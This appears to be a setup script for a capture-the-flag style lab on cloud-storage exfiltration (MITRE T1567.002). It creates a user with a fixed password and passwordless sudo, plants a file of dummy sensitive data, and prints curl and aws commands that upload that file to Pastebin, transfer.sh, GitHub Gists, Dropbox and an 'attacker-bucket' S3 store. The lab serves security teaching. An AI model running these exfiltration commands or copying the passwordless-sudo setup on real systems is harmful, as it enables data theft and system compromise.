#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{CLOUD_STORAGE_EXFIL_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-cloud; chmod 440 /etc/sudoers.d/player-cloud
mkdir -p /opt/sensitive-data
echo "$FLAG" > /opt/sensitive-data/exfil_data.txt
echo "employee_ssn=123-45-6789" >> /opt/sensitive-data/exfil_data.txt
echo "credit_card=4111-1111-1111-1111" >> /opt/sensitive-data/exfil_data.txt
chmod 644 /opt/sensitive-data/exfil_data.txt
cat > /opt/cloud_exfil_demo.sh << 'DEMOEOF'
#!/bin/bash
# T1567.002 – Cloud Storage Exfil Demo
echo "=== Cloud Storage Exfiltration Methods ==="
echo ""
echo "1. Pastebin (public paste):"
echo "   curl -X POST 'https://pastebin.com/api/api_post.php' \\"
echo "        -d 'api_dev_key=API_KEY' -d 'api_option=paste' \\"
echo "        --data-urlencode 'api_paste_code@/opt/sensitive-data/exfil_data.txt'"
echo ""
echo "2. Transfer.sh (anonymous file host):"
echo "   curl --upload-file /opt/sensitive-data/exfil_data.txt https://transfer.sh/exfil.txt"
echo ""
echo "3. GitHub Gist (via API):"
echo "   curl -H 'Authorization: token GITHUB_TOKEN' \\"
echo "        -d '{\"files\":{\"stolen.txt\":{\"content\":\"STOLEN_DATA\"}}}' \\"
echo "        https://api.github.com/gists"
echo ""
echo "4. S3 bucket (with stolen AWS keys):"
echo "   aws s3 cp /opt/sensitive-data/exfil_data.txt s3://attacker-bucket/stolen.txt"
echo ""
echo "5. Dropbox API:"
echo "   curl -X POST 'https://content.dropboxapi.com/2/files/upload' \\"
echo "        -H 'Authorization: Bearer TOKEN' \\"
echo "        --data-binary @/opt/sensitive-data/exfil_data.txt"
echo ""
echo "Flag: $(cat /opt/sensitive-data/exfil_data.txt | head -1)"
DEMOEOF
chmod 755 /opt/cloud_exfil_demo.sh
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1567.002 Exfiltration to Cloud Storage ===
Login  : player / Player@123
Goal   : Understand cloud storage exfiltration methods.
         1. Run /opt/cloud_exfil_demo.sh to see all techniques
         2. Simulate local: start python HTTP server as "cloud target"
            python3 -m http.server 9090 &
            curl -T /opt/sensitive-data/exfil_data.txt http://localhost:9090/
         3. Encode and exfiltrate to a local "pastebin" simulation
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1567.002 setup complete."
